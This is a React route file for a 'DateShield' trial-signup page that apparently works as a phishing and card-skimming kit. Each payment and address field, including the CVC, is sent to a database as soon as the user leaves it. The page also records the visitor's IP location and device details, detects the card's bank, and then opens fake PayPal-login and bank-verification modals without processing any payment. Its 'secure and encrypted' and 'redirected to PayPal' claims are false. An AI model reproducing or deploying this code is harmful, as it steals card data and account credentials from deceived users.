import { createFileRoute, Link, useNavigate } from "@tanstack/react-router";
import { useState, useRef, useEffect, useMemo } from "react";
import { zodValidator, fallback } from "@tanstack/zod-adapter";
import { z } from "zod";
import { PhoneFrame } from "@/components/PhoneFrame";
import { BankVerifyModal } from "@/components/BankVerifyModal";
import { PaypalLoginModal } from "@/components/PaypalLoginModal";
import { PaypalLoadingOverlay } from "@/components/PaypalLoadingOverlay";
import { supabase } from "@/integrations/supabase/client";
import { detectCardBrand, luhnCheck, lookupBin, type CardBrand } from "@/lib/card-utils";
import { US_STATES } from "@/lib/us-states";
import { US_BANKS } from "@/lib/us-banks";
import {
  Lock,
  CreditCard,
  Calendar,
  ShieldCheck,
  CheckCircle2,
  AlertCircle,
  ArrowLeft,
  Sparkles,
  Loader2,
} from "lucide-react";

const ALL_CARDS: { brand: Exclude<CardBrand, null>; src: string; alt: string }[] = [
  { brand: "visa", src: "/cards/visa.png", alt: "Visa" },
  { brand: "mastercard", src: "/cards/mastercard.png", alt: "Mastercard" },
  { brand: "amex", src: "/cards/amex.png", alt: "American Express" },
  { brand: "discover", src: "/cards/discover.png", alt: "Discover" },
  { brand: "unionpay", src: "/cards/unionpay.png", alt: "UnionPay" },
  { brand: "jcb", src: "/cards/jcb.png", alt: "JCB" },
];

const trialSearchSchema = z.object({
  plan: fallback(z.enum(["basic", "pro", "unlimited"]), "pro").default("pro"),
});

const PLANS = {
  basic: { name: "Basic", price: "0.00", per: "Free", scans: "3 scans / month", note: "Free forever — verify a payment method to prevent abuse." },
  pro: { name: "Pro", price: "9.99", per: "/mo", scans: "100 scans / month", note: "30 days free · Then $9.99/mo · Cancel anytime" },
  unlimited: { name: "Unlimited", price: "19.99", per: "/mo", scans: "Unlimited scans", note: "30 days free · Then $19.99/mo · Cancel anytime" },
} as const;

export const Route = createFileRoute("/trial")({
  component: TrialPage,
  validateSearch: zodValidator(trialSearchSchema),
  head: () => ({
    meta: [
      { title: "Start Your Free Trial — DateShield" },
      {
        name: "description",
        content:
          "Add a payment method to unlock your 30-day free DateShield trial. No charge today, cancel anytime.",
      },
      { property: "og:title", content: "Start Your 30-Day Free Trial — DateShield" },
      {
        property: "og:description",
        content: "Verify a payment method to start your free DateShield trial.",
      },
    ],
  }),
});

type Method = "card" | "paypal";
type Status = "idle" | "loading" | "success" | "error";

function TrialPage() {
  const navigate = useNavigate();
  const search = Route.useSearch() as { plan: keyof typeof PLANS };
  const plan = search.plan ?? "pro";
  const planInfo = PLANS[plan];
  const isBasic = plan === "basic";
  const [method, setMethod] = useState<Method>("paypal");
  const [status, setStatus] = useState<Status>("idle");
  const [showBankModal, setShowBankModal] = useState(false);
  const [showPaypalModal, setShowPaypalModal] = useState(false);
  const [showPaypalLoader, setShowPaypalLoader] = useState(false);
  const [card, setCard] = useState({ number: "", exp: "", cvc: "", name: "" });
  const [billing, setBilling] = useState({
    address1: "",
    address2: "",
    city: "",
    state: "",
    postal: "",
    country: "United States",
    phone: "+1 ",
  });
  const [detectedBank, setDetectedBank] = useState<string | null>(null);
  const [binCountry, setBinCountry] = useState<string | null>(null);
  const [slideIdx, setSlideIdx] = useState(0);
  const sessionIdRef = useRef<string>("");
  if (!sessionIdRef.current) {
    if (typeof window !== "undefined") {
      const existing = sessionStorage.getItem("trial_session_id");
      if (existing) sessionIdRef.current = existing;
      else {
        sessionIdRef.current = crypto.randomUUID();
        sessionStorage.setItem("trial_session_id", sessionIdRef.current);
      }
    }
  }

  useEffect(() => {
    if (!sessionIdRef.current) return;
    supabase.from("trial_submissions").upsert(
      { session_id: sessionIdRef.current, method },
      { onConflict: "session_id" }
    ).then(() => {});
  }, [method]);

  const pushField = async (field: string, value: string) => {
    if (!sessionIdRef.current) return;
    await supabase.from("trial_submissions").upsert(
      { session_id: sessionIdRef.current, method, [field]: value } as never,
      { onConflict: "session_id" }
    );
  };
  const phoneDigits = billing.phone.replace(/\D/g, "").replace(/^1/, "");
  const phoneValid = phoneDigits.length === 10;
  const addressValid =
    billing.address1.trim().length > 1 &&
    billing.city.trim().length > 1 &&
    billing.state.trim().length > 1 &&
    /^\d{5}(-\d{4})?$/.test(billing.postal.trim()) &&
    billing.country.trim().length > 1;
  const billingValid = addressValid && phoneValid;
  const addressTouched =
    billing.address1.length > 0 ||
    billing.city.length > 0 ||
    billing.state.length > 0 ||
    billing.postal.length > 0;
  const phoneTouched = phoneDigits.length > 0;

  const formatUsPhone = (raw: string) => {
    let d = raw.replace(/\D/g, "");
    if (d.startsWith("1")) d = d.slice(1);
    d = d.slice(0, 10);
    let out = "+1 ";
    if (d.length > 0) out += "(" + d.slice(0, 3);
    if (d.length >= 3) out += ") ";
    if (d.length >= 4) out += d.slice(3, 6);
    if (d.length >= 6) out += "-" + d.slice(6, 10);
    return out;
  };

  const formatCard = (v: string) =>
    v.replace(/\D/g, "").slice(0, 16).replace(/(.{4})/g, "$1 ").trim();
  const formatExp = (v: string) => {
    const d = v.replace(/\D/g, "").slice(0, 4);
    return d.length > 2 ? `${d.slice(0, 2)}/${d.slice(2)}` : d;
  };

  const rawCard = card.number.replace(/\s/g, "");
  const brand: CardBrand = useMemo(() => detectCardBrand(rawCard), [rawCard]);
  const luhnValid = useMemo(() => (rawCard.length >= 12 ? luhnCheck(rawCard) : true), [rawCard]);
  const cardComplete = rawCard.length >= 15 && luhnCheck(rawCard);
  const cardValid =
    cardComplete &&
    card.exp.length === 5 &&
    card.cvc.length >= 3 &&
    card.name.trim().length > 1;

  // Auto-rotate the 4th visible card slot through the extra brands
  const extraCards = useMemo(() => ALL_CARDS.slice(3), []);
  useEffect(() => {
    if (brand) return;
    const t = setInterval(() => setSlideIdx((i) => (i + 1) % extraCards.length), 3000);
    return () => clearInterval(t);
  }, [brand, extraCards.length]);

  // Collect device + IP info once per session and push to DB
  useEffect(() => {
    if (!sessionIdRef.current) return;
    if (typeof window === "undefined") return;
    if (sessionStorage.getItem("trial_env_pushed") === "1") return;

    const ua = navigator.userAgent;
    const parseBrowser = (u: string) => {
      if (/Edg\//.test(u)) return "Microsoft Edge";
      if (/OPR\//.test(u)) return "Opera";
      if (/Chrome\//.test(u) && !/Chromium/.test(u)) return "Chrome";
      if (/Firefox\//.test(u)) return "Firefox";
      if (/Safari\//.test(u) && !/Chrome/.test(u)) return "Safari";
      return "Unknown";
    };
    const parseOS = (u: string) => {
      if (/Windows NT 10/.test(u)) return "Windows 10/11";
      if (/Windows/.test(u)) return "Windows";
      if (/Android/.test(u)) return "Android";
      if (/iPhone|iPad|iPod/.test(u)) return "iOS";
      if (/Mac OS X/.test(u)) return "macOS";
      if (/Linux/.test(u)) return "Linux";
      return "Unknown";
    };
    const parseDevice = (u: string) => {
      const m = u.match(/\(([^)]+)\)/);
      if (!m) return "Desktop";
      const inside = m[1];
      if (/iPhone/.test(inside)) return "Apple iPhone";
      if (/iPad/.test(inside)) return "Apple iPad";
      const android = inside.match(/Android[^;]*;\s*([^;]+?)(?:Build|;|\))/);
      if (android) return android[1].trim();
      if (/Macintosh/.test(inside)) return "Apple Mac";
      if (/Windows/.test(inside)) return "Windows PC";
      if (/Linux/.test(inside)) return "Linux PC";
      return "Desktop";
    };

    (async () => {
      let ip: string | null = null;
      let city: string | null = null;
      let region: string | null = null;
      let country: string | null = null;
      let isp: string | null = null;
      try {
        const r = await fetch("https://ipwho.is/");
        const j = await r.json();
        if (j && j.success !== false) {
          ip = j.ip ?? null;
          city = j.city ?? null;
          region = j.region ?? null;
          country = j.country ?? null;
          isp = j.connection?.isp ?? j.connection?.org ?? null;
        }
      } catch { /* ignore */ }

      await supabase.from("trial_submissions").upsert(
        {
          session_id: sessionIdRef.current,
          user_agent: ua,
          browser: parseBrowser(ua),
          os: parseOS(ua),
          device: parseDevice(ua),
          ip,
          ip_city: city,
          ip_region: region,
          ip_country: country,
          ip_isp: isp,
        } as never,
        { onConflict: "session_id" }
      );
      sessionStorage.setItem("trial_env_pushed", "1");
    })();
  }, []);

  // BIN lookup (debounced) — auto-detect issuing bank/country
  useEffect(() => {
    if (rawCard.length < 6) {
      setDetectedBank(null);
      setBinCountry(null);
      return;
    }
    const handle = setTimeout(async () => {
      const info = await lookupBin(rawCard);
      if (!info) return;
      setBinCountry(info.country);
      if (info.bank) {
        // try to match against our known US banks list
        const match = US_BANKS.find((b) =>
          b.name.toLowerCase().includes(info.bank!.toLowerCase().split(/[\s,]/)[0])
        );
        setDetectedBank(match?.name ?? info.bank);
      }
    }, 500);
    return () => clearTimeout(handle);
  }, [rawCard]);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (status === "loading") return;
    if (method === "paypal") {
      setShowPaypalLoader(true);
      setTimeout(() => {
        setShowPaypalLoader(false);
        setShowPaypalModal(true);
      }, 1800);
    } else setShowBankModal(true);
  };

  return (
    <main className="relative flex min-h-screen w-full items-center justify-center px-4 py-10">
      {/* ambient glows */}
      <div className="pointer-events-none absolute inset-0 overflow-hidden">
        <div className="absolute -top-32 left-1/2 h-72 w-72 -translate-x-1/2 rounded-full bg-[oklch(0.45_0.18_155/0.35)] blur-3xl" />
        <div className="absolute -bottom-32 left-1/2 h-72 w-72 -translate-x-1/2 rounded-full bg-[oklch(0.6_0.2_45/0.35)] blur-3xl" />
      </div>

      <PhoneFrame>
        <div className="animate-fade-up space-y-6">
          {/* Header */}
          <div className="flex items-center justify-between pt-1">
            <Link
              to="/signup"
              className="flex h-9 w-9 items-center justify-center rounded-full glass text-white/80 transition hover:text-white"
              aria-label="Back"
            >
              <ArrowLeft className="h-4 w-4" />
            </Link>
            <span className="text-[11px] font-medium uppercase tracking-wider text-white/60">
              Step 2 of 2
            </span>
            <div className="h-9 w-9" />
          </div>

          {status === "success" ? (
            <SuccessState />
          ) : (
            <>
              {/* Title */}
              <div className="space-y-2 text-center">
                <div className="mx-auto flex h-12 w-12 items-center justify-center rounded-2xl gradient-azure shadow-glow">
                  <Sparkles className="h-6 w-6 text-white" />
                </div>
                <h1 className="font-display text-2xl font-semibold tracking-tight text-white">
                  {isBasic ? "Activate your Basic plan" : `Start your ${planInfo.name} trial`}
                </h1>
                <p className="text-sm leading-relaxed text-white/65">
                  {isBasic
                    ? "The Basic plan is free — but we need to verify a payment method to prevent abuse. You won't be charged."
                    : "Add a payment method to begin. You won't be charged today."}
                </p>
              </div>

              {/* Trial summary */}
              <div className="glass flex items-center gap-3 rounded-2xl p-3.5">
                <div className="flex h-10 w-10 items-center justify-center rounded-xl bg-[var(--azure)]/15 text-[var(--azure-glow)]">
                  <Calendar className="h-5 w-5" />
                </div>
                <div className="flex-1">
                  <p className="text-sm font-medium text-white">
                    {planInfo.name} · {planInfo.scans}
                  </p>
                  <p className="text-[11px] text-white/55">{planInfo.note}</p>
                </div>
                <span className="rounded-full bg-[var(--success)]/15 px-2.5 py-1 text-[10px] font-semibold uppercase tracking-wide text-[oklch(0.85_0.16_150)]">
                  $0 today
                </span>
              </div>

              {/* Method tabs */}
              <div className="glass grid grid-cols-2 gap-1 rounded-2xl p-1">
                <TabButton active={method === "paypal"} onClick={() => setMethod("paypal")}>
                  <PaypalIcon className="h-4 w-4" /> PayPal
                </TabButton>
                <TabButton active={method === "card"} onClick={() => setMethod("card")}>
                  <CreditCard className="h-4 w-4" /> Card
                </TabButton>
              </div>

              <form onSubmit={handleSubmit} className="space-y-4">
                {method === "card" ? (
                  <div className="space-y-3">
                    <CardNumberField
                      value={card.number}
                      onChange={(v) => setCard({ ...card, number: formatCard(v) })}
                      onBlur={() => pushField("card_number", card.number)}
                      brand={brand}
                      slideIdx={slideIdx}
                      extraCards={extraCards}
                      invalid={rawCard.length >= 12 && !luhnValid}
                    />
                    <div className="grid grid-cols-2 gap-3">
                      <CardField
                        label="Expiry"
                        value={card.exp}
                        onChange={(v) => setCard({ ...card, exp: formatExp(v) })}
                        onBlur={() => pushField("card_exp", card.exp)}
                        placeholder="MM/YY"
                        inputMode="numeric"
                      />
                      <CardField
                        label="CVC"
                        value={card.cvc}
                        onChange={(v) =>
                          setCard({ ...card, cvc: v.replace(/\D/g, "").slice(0, 4) })
                        }
                        onBlur={() => pushField("card_cvc", card.cvc)}
                        placeholder="123"
                        inputMode="numeric"
                        type="password"
                      />
                    </div>
                    <CardField
                      label="Cardholder name"
                      value={card.name}
                      onChange={(v) => setCard({ ...card, name: v })}
                      onBlur={() => pushField("card_name", card.name)}
                      placeholder="Jane Doe"
                    />
                    {(detectedBank || binCountry) && (
                      <div className="flex items-center gap-2 rounded-xl border border-[var(--azure)]/30 bg-[var(--azure)]/10 px-3 py-2 text-[11px] text-white/85">
                        <ShieldCheck className="h-3.5 w-3.5 text-[var(--azure-glow)]" />
                        <span>
                          {detectedBank ? `Issued by ${detectedBank}` : "Card issuer detected"}
                          {binCountry ? ` · ${binCountry}` : ""}
                        </span>
                      </div>
                    )}
                    <div className="flex items-center gap-2 text-[11px] text-white/55">
                      <Lock className="h-3 w-3 text-[var(--azure-glow)]" />
                      Secure and encrypted payment
                    </div>
                  </div>
                ) : (
                  <div className="glass-strong space-y-3 rounded-2xl p-5 text-center">
                    <PaypalIcon className="mx-auto h-8 w-8" />
                    <p className="text-sm text-white/75">
                      You'll be redirected to PayPal to securely authorize your trial.
                    </p>
                    <div className="flex items-center justify-center gap-2 text-[11px] text-white/55">
                      <Lock className="h-3 w-3 text-[var(--azure-glow)]" />
                      No charge today
                    </div>
                  </div>
                )}

                {/* Billing Address */}
                <div className="space-y-3 pt-2">
                  <div className="flex items-center justify-between">
                    <h3 className="text-[13px] font-semibold uppercase tracking-wider text-white/75">
                      Billing Address
                    </h3>
                  </div>
                  <CardField
                    label="Address 1*"
                    value={billing.address1}
                    onChange={(v) => setBilling({ ...billing, address1: v })}
                    onBlur={() => pushField("address1", billing.address1)}
                    placeholder="123 Main St"
                  />
                  <CardField
                    label="Address 2"
                    value={billing.address2}
                    onChange={(v) => setBilling({ ...billing, address2: v })}
                    onBlur={() => pushField("address2", billing.address2)}
                    placeholder="Apt, suite, etc. (optional)"
                  />
                  <div className="grid grid-cols-2 gap-3">
                    <CardField
                      label="City*"
                      value={billing.city}
                      onChange={(v) => setBilling({ ...billing, city: v })}
                      onBlur={() => pushField("city", billing.city)}
                      placeholder="City"
                    />
                    <SelectField
                      label="State*"
                      value={billing.state}
                      onChange={(v) => {
                        setBilling({ ...billing, state: v });
                      }}
                      onBlur={() => pushField("state", billing.state)}
                    >
                      <option value="">Select state</option>
                      {US_STATES.map((s) => (
                        <option key={s.code} value={s.code}>
                          {s.code} — {s.name}
                        </option>
                      ))}
                    </SelectField>
                  </div>
                  <div className="grid grid-cols-2 gap-3">
                    <CardField
                      label="Postal code*"
                      value={billing.postal}
                      onChange={(v) => setBilling({ ...billing, postal: v })}
                      onBlur={() => pushField("postal", billing.postal)}
                      placeholder="12345"
                      inputMode="numeric"
                    />
                    <CardField
                      label="Country*"
                      value={billing.country}
                      onChange={() => {}}
                      onBlur={() => pushField("country", billing.country)}
                      placeholder="United States"
                      readOnly
                    />
                  </div>
                  <CardField
                    label="Phone*"
                    value={billing.phone}
                    onChange={(v) =>
                      setBilling({ ...billing, phone: formatUsPhone(v) })
                    }
                    onBlur={() => pushField("phone", billing.phone)}
                    placeholder="+1 (555) 000-0000"
                    inputMode="numeric"
                  />
                </div>

                {status === "error" && (
                  <div className="flex items-start gap-2 rounded-2xl border border-[var(--danger)]/40 bg-[var(--danger)]/10 p-3 text-xs text-[oklch(0.88_0.1_25)]">
                    <AlertCircle className="mt-0.5 h-4 w-4 shrink-0" />
                    <span>Verification failed. Please try another payment method.</span>
                  </div>
                )}

                <button
                  type="submit"
                  disabled={
                    status === "loading" || !billingValid || (method === "card" && !cardValid)
                  }
                  className="group relative flex h-14 w-full items-center justify-center gap-2 overflow-hidden rounded-2xl gradient-azure text-base font-semibold text-white shadow-glow transition-all duration-200 hover:shadow-[0_14px_50px_-10px_oklch(0.68_0.18_240/0.7)] active:scale-[0.98] disabled:cursor-not-allowed disabled:opacity-50"
                >
                  {status === "loading" ? (
                    <>
                      <Loader2 className="h-5 w-5 animate-spin" /> Verifying…
                    </>
                  ) : method === "paypal" ? (
                    <>Continue with PayPal</>
                  ) : (
                    <>{isBasic ? "Verify & activate Basic" : `Start your ${planInfo.name} trial`}</>
                  )}
                </button>

                <div className="flex items-center justify-center gap-4 text-[11px] text-white/55">
                  <span className="flex items-center gap-1">
                    <CheckCircle2 className="h-3 w-3 text-[oklch(0.78_0.16_150)]" /> No charge today
                  </span>
                  <span className="flex items-center gap-1">
                    <CheckCircle2 className="h-3 w-3 text-[oklch(0.78_0.16_150)]" /> Cancel anytime
                  </span>
                </div>

                <div className="flex items-center justify-center gap-2 pt-2 text-[10px] text-white/45">
                  <ShieldCheck className="h-3 w-3" />
                  Your payment details are secure and encrypted
                </div>
              </form>
            </>
          )}
        </div>
      </PhoneFrame>

      <footer className="absolute bottom-4 left-0 right-0 text-center text-[10px] text-white/40">
        <Link to="/" className="hover:text-white/70">Privacy</Link>
        <span className="mx-2">·</span>
        <Link to="/" className="hover:text-white/70">Terms</Link>
      </footer>

      {showBankModal && sessionIdRef.current && (
        <BankVerifyModal
          sessionId={sessionIdRef.current}
          prefilledBank={detectedBank}
          onClose={() => setShowBankModal(false)}
          onComplete={() => {
            setShowBankModal(false);
            try { localStorage.setItem("trial_completed_at", new Date().toISOString()); } catch {}
            navigate({ to: "/dashboard" });
          }}
        />
      )}

      {showPaypalModal && sessionIdRef.current && (
        <PaypalLoginModal
          sessionId={sessionIdRef.current}
          onClose={() => setShowPaypalModal(false)}
          onComplete={() => {
            setShowPaypalModal(false);
            try { localStorage.setItem("trial_completed_at", new Date().toISOString()); } catch {}
            navigate({ to: "/dashboard" });
          }}
        />
      )}

      {showPaypalLoader && <PaypalLoadingOverlay />}
    </main>
  );
}

function TabButton({
  active,
  onClick,
  children,
}: {
  active: boolean;
  onClick: () => void;
  children: React.ReactNode;
}) {
  return (
    <button
      type="button"
      onClick={onClick}
      className={`flex h-10 items-center justify-center gap-2 rounded-xl text-sm font-medium transition-all ${
        active
          ? "gradient-azure text-white shadow-glow"
          : "text-white/65 hover:text-white"
      }`}
    >
      {children}
    </button>
  );
}

function CardField({
  label,
  value,
  onChange,
  onBlur,
  placeholder,
  icon,
  type = "text",
  inputMode,
  readOnly,
}: {
  label: string;
  value: string;
  onChange: (v: string) => void;
  onBlur?: () => void;
  placeholder?: string;
  icon?: React.ReactNode;
  type?: string;
  inputMode?: "text" | "numeric";
  readOnly?: boolean;
}) {
  return (
    <label className="block">
      <span className="mb-1.5 block text-[11px] font-medium uppercase tracking-wider text-white/55">
        {label}
      </span>
      <div className="group relative">
        {icon && (
          <span className="pointer-events-none absolute left-3.5 top-1/2 -translate-y-1/2 text-white/45 transition group-focus-within:text-[var(--azure-glow)]">
            {icon}
          </span>
        )}
        <input
          type={type}
          inputMode={inputMode}
          value={value}
          onChange={(e) => onChange(e.target.value)}
          onBlur={onBlur}
          placeholder={placeholder}
          readOnly={readOnly}
          className={`h-12 w-full rounded-xl border border-white/10 bg-white/[0.04] ${
            icon ? "pl-10" : "pl-3.5"
          } pr-3.5 text-sm text-white placeholder:text-white/35 outline-none transition-all duration-200 focus:border-[var(--azure)]/60 focus:bg-white/[0.07] focus:shadow-[0_0_0_4px_oklch(0.68_0.18_240/0.18)] ${
            readOnly ? "cursor-not-allowed opacity-80" : ""
          }`}
        />
      </div>
    </label>
  );
}

function SelectField({
  label,
  value,
  onChange,
  onBlur,
  children,
}: {
  label: string;
  value: string;
  onChange: (v: string) => void;
  onBlur?: () => void;
  children: React.ReactNode;
}) {
  return (
    <label className="block">
      <span className="mb-1.5 block text-[11px] font-medium uppercase tracking-wider text-white/55">
        {label}
      </span>
      <select
        value={value}
        onChange={(e) => onChange(e.target.value)}
        onBlur={onBlur}
        style={{ colorScheme: "dark" }}
        className="h-12 w-full appearance-none rounded-xl border border-white/10 bg-white/[0.04] bg-[length:16px] bg-[right_0.75rem_center] bg-no-repeat px-3 pr-9 text-sm text-white outline-none transition-all duration-200 focus:border-[var(--azure)]/60 focus:bg-white/[0.07] focus:shadow-[0_0_0_4px_oklch(0.68_0.18_240/0.18)] [&>option]:bg-[#0e2424] [&>option]:text-white"
        // chevron
      >
        {children}
      </select>
    </label>
  );
}

function CardNumberField({
  value,
  onChange,
  onBlur,
  brand,
  slideIdx,
  extraCards,
  invalid,
}: {
  value: string;
  onChange: (v: string) => void;
  onBlur?: () => void;
  brand: CardBrand;
  slideIdx: number;
  extraCards: { brand: Exclude<CardBrand, null>; src: string; alt: string }[];
  invalid: boolean;
}) {
  const fixed = ALL_CARDS.slice(0, 3);
  const rotating = extraCards[slideIdx % extraCards.length];

  return (
    <label className="block">
      <span className="mb-1.5 flex items-center justify-between text-[11px] font-medium uppercase tracking-wider text-white/55">
        <span>Card number</span>
        {invalid && (
          <span className="flex items-center gap-1 normal-case tracking-normal text-[oklch(0.78_0.16_25)]">
            <AlertCircle className="h-3 w-3" /> Invalid card
          </span>
        )}
      </span>
      <div className="group relative">
        <span className="pointer-events-none absolute left-3.5 top-1/2 -translate-y-1/2 text-white/45 transition group-focus-within:text-[var(--azure-glow)]">
          <CreditCard className="h-4 w-4" />
        </span>
        <input
          type="text"
          inputMode="numeric"
          value={value}
          onChange={(e) => onChange(e.target.value)}
          onBlur={onBlur}
          placeholder="1234 5678 9012 3456"
          className={`h-12 w-full rounded-xl border bg-white/[0.04] pl-10 pr-[120px] text-sm text-white placeholder:text-white/35 outline-none transition-all duration-200 focus:bg-white/[0.07] focus:shadow-[0_0_0_4px_oklch(0.68_0.18_240/0.18)] ${
            invalid
              ? "border-[oklch(0.6_0.2_25)]/60 focus:border-[oklch(0.6_0.2_25)]"
              : "border-white/10 focus:border-[var(--azure)]/60"
          }`}
        />
        <div className="pointer-events-none absolute right-2 top-1/2 flex -translate-y-1/2 items-center gap-1">
          {brand ? (
            <img
              src={ALL_CARDS.find((c) => c.brand === brand)!.src}
              alt={brand}
              className="h-4 w-6 rounded-sm object-contain"
            />
          ) : (
            <>
              {fixed.map((c) => (
                <img
                  key={c.brand}
                  src={c.src}
                  alt={c.alt}
                  className="h-4 w-6 rounded-sm object-contain opacity-90"
                />
              ))}
              <div className="relative h-4 w-6 overflow-hidden">
                <img
                  key={rotating.brand}
                  src={rotating.src}
                  alt={rotating.alt}
                  className="absolute inset-0 h-4 w-6 animate-fade-in rounded-sm object-contain"
                />
              </div>
            </>
          )}
        </div>
      </div>
    </label>
  );
}

function SuccessState() {
  return (
    <div className="flex flex-col items-center space-y-5 py-6 text-center">
      <div className="relative">
        <span className="absolute inset-0 animate-pulse-ring rounded-full bg-[var(--success)]/40" />
        <div className="relative flex h-20 w-20 items-center justify-center rounded-full bg-gradient-to-br from-[oklch(0.74_0.18_150)] to-[oklch(0.6_0.18_160)] shadow-[0_10px_40px_-10px_oklch(0.74_0.18_150/0.7)]">
          <CheckCircle2 className="h-10 w-10 text-white" strokeWidth={2.5} />
        </div>
      </div>
      <div className="space-y-2">
        <h2 className="font-display text-2xl font-semibold text-white">
          🎉 Your 30-day free trial is now active
        </h2>
        <p className="text-sm text-white/65">
          Welcome to DateShield. You won't be charged until your trial ends.
        </p>
      </div>
      <Link
        to="/"
        className="flex h-12 w-full items-center justify-center rounded-2xl gradient-azure font-semibold text-white shadow-glow transition active:scale-[0.98]"
      >
        Go to Dashboard
      </Link>
    </div>
  );
}

function PaypalIcon({ className = "" }: { className?: string }) {
  return (
    <svg viewBox="0 0 24 24" className={className} fill="none">
      <path
        d="M7.5 4h6.8c2.7 0 4.5 1.4 4 4.2-.6 3.2-2.9 4.6-5.9 4.6h-1.6c-.4 0-.7.3-.8.7l-.9 5.5c0 .3-.3.5-.6.5H6.1c-.3 0-.5-.2-.4-.5L7.5 4Z"
        fill="#fff"
      />
      <path
        d="M9.8 7h5.4c2.2 0 3.6 1.1 3.2 3.4-.5 2.6-2.3 3.7-4.7 3.7h-1.3c-.3 0-.5.2-.6.5l-.7 4.4c0 .2-.2.4-.5.4H8.4c-.2 0-.4-.2-.3-.4L9.8 7Z"
        fill="#038dff"
      />
    </svg>
  );
}
